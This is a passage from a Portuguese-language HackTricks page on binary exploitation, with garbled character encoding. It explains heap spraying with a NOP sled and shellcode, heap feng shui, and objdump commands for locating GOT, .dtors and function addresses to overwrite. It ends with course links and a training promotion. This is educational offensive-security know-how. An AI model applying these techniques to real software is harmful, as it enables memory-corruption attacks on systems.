Al√©m disso, foi introduzido um patch para torn√°-lo ainda mais complicado.

**Heap Spraying**

Basicamente consiste em reservar toda a mem√≥ria poss√≠vel para heaps e preencher esses com um colch√£o de nops acabados por uma shellcode. Al√©m disso, como colch√£o se utiliza 0x0c. Pois se tentar√° saltar para o endere√ßo 0x0c0c0c0c, e assim se sobrescrever alguma dire√ß√£o a que se v√° chamar com esse colch√£o, se saltar√° ali. Basicamente, a t√°tica √© reservar o m√°ximo poss√≠vel para ver se se sobrescreve algum ponteiro e saltar para 0x0c0c0c0c esperando que ali haja nops.

**Heap Feng Shui**

Consiste em, atrav√©s de reservas e libera√ß√µes, semear a mem√≥ria de forma que fiquem trozos reservados entre trozos livres. O buffer a desbordar se situar√° em um dos ovos.

**objdump -d execut√°vel** ‚Äî> Disas functions\
**objdump -d ./PROGRAMA | grep FUNCION** ‚Äî> Obter endere√ßo da fun√ß√£o\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para ver que efetivamente √© nossa shellcode e tirar os OpCodes\
**objdump -t ./exec | grep varBss** ‚Äî> Tabela de s√≠mbolos, para tirar endere√ßo de vari√°veis e fun√ß√µes\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Para tirar endere√ßo de fun√ß√µes de bibliotecas (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Tira o endere√ßo de puts a sobrescrever na GOT\
**objdump -D ./exec** ‚Äî> Disas ALL at√© as entradas da plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Info da fun√ß√£o em gdb

## Cursos interessantes

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Refer√™ncias**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

{% hint style="success" %}
Aprenda e pratique AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
